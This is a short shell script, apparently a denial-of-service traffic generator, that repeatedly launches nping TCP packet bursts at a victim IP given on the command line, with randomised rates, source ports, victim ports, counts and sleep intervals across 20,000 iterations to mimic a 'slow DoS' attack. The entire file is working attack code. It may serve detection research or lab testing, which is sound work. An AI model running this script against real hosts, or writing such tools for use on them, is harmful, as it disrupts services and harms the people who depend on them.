#!/bin/sh


# generate slow dos attacking traffics from random source ip:port 

# define rate parameters
FLOOR_RATE=1000;
CEILING_RATE=20000;
RATE_RANGE=$(($CEILING_RATE-$FLOOR_RATE+1));

# define src ports parameters
FLOOR_SRCPORT=7000;
CEILING_SRCPORT=8000;
SRCPORT_RANGE=$(($CEILING_SRCPORT-$FLOOR_SRCPORT+1));


# define atk_cnt parameters
FLOOR_CNT=1;
CEILING_CNT=100;
CNT_RANGE=$(($CEILING_CNT-$FLOOR_CNT+1))

# define repeat_times parameters
FLOOR_REPS=1;
CEILING_REPS=10;
REPS_RANGE=$(($CEILING_REPS-$FLOOR_REPS+1))



# define sleep parameter for discontinuous attacks
FLOOR_SLEEP=1;
CEILING_SLEEP=4;
SLEEP_RANGE=$((CEILING_SLEEP-$FLOOR_SLEEP+1));


# define attack properties

VICTIM_IP=$1


for ((i=0; i<20000; i++))
do

# generate random rate for slow dos
	RATE=$RANDOM;
	let "RATE %= $RATE_RANGE";
	RATE=$(($RATE+$FLOOR_RATE));
	echo "Rate of the slow attack: $RATE"
	


# generate random source port number
	SRC_PORT=$RANDOM;
	let "SRC_PORT %= $SRCPORT_RANGE";
	SRC_PORT=$(($SRC_PORT+$FLOOR_SRCPORT));
	echo "Source port: $SRC_PORT"


# generate random sleep timing
	SLEEP=$RANDOM;
	let "SLEEP %= $SLEEP_RANGE";
	SLEEP=$(($SLEEP+$FLOOR_SLEEP));
	echo "sleep period: $SLEEP"

# generate random victim port numbers
	#FLOOR_VIC_PORT=$(($RANDOM+$RANDOM))
	#FLOOR_VIC_PORT=$(($FLOOR_VIC_PORT-$NUM_VICTIM_PORT))
	#while [[ $FLOOR_VIC_PORT -le 0 ]]
	#do
	#	FLOOR_VIC_PORT=$(($RANDOM+$RANDOM))
	#	FLOOR_VIC_PORT=$(($FLOOR_VIC_PORT-$NUM_VICTIM_PORT))
	#done
	
	#CEILING_VIC_PORT=$(($FLOOR_VIC_PORT+$NUM_VICTIM_PORT)) 
	#echo "victim ports $FLOOR_VIC_PORT-$CEILING_VIC_PORT"



# generate random victim port number
	VIC_PORT=$(($RANDOM+$RANDOM))
	echo "victim ports: $VIC_PORT"
	
# generate random repeat times of each attacks
	REPS=$RANDOM
	let "REPS %= $REPS_RANGE";
	REPS=$(($REPS+$FLOOR_REPS));
	echo "repeat times: $REPS"
	
# launch the attack
	for (( r=0; r <= $REPS; r++ ))
	do
		# generate random count for -c 
		CNT=$RANDOM;
		let "CNT %=$CNT_RANGE";
		CNT=$(($CNT+$FLOOR_CNT));
		echo "number of attack pkts: $CNT"
		
		nping --tcp $VICTIM_IP -c $CNT --rate $RATE --source-port $SRC_PORT -p $VIC_PORT

	
		# generate random sleep timing
		SLEEP=$RANDOM;
		let "SLEEP %= $SLEEP_RANGE";
		SLEEP=$(($SLEEP+$FLOOR_SLEEP));
		echo "sleep period: $SLEEP";
		
		sleep $SLEEP;
	done
		
	echo "attacker count = $i";
	printf '\n \n \n'
	

done
